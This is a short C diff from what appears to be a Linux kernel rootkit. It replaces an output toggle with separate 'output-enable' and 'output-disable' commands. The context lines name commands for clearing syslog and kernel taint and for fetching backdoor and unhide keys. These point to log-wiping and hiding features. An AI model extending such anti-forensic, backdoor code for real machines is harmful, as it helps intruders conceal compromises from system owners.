@@ -365,9 +365,9 @@ static void _set_msguser_retcode(void *bytes, int type)
 		_set_msguser(bytes, type);
 }
 
-static inline void _msguser_toggle(void)
+static inline void _msguser_toggle(bool enable)
 {
-	msguser_enable = !msguser_enable;
+	msguser_enable = enable;
 	_set_msguser(&msguser_enable, MSG_INT);
 }
 
@@ -488,6 +488,7 @@ enum {
 	Opt_syslog_clear,
 	Opt_taint_clear,
 	Opt_output_enable,
+	Opt_output_disable,
 
 #ifdef DEBUG_RING_BUFFER
 	// debug
@@ -522,6 +523,7 @@ static const match_table_t tokens = {
 	{ Opt_syslog_clear, "syslog-clear" },
 	{ Opt_taint_clear, "taint-clear" },
 	{ Opt_output_enable, "output-enable" },
+	{ Opt_output_disable, "output-disable" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -743,7 +745,10 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 
 		} break;
 		case Opt_output_enable:
-			_msguser_toggle();
+			_msguser_toggle(true);
+			break;
+		case Opt_output_disable:
+			_msguser_toggle(false);
 			break;
 		default:
 			break;
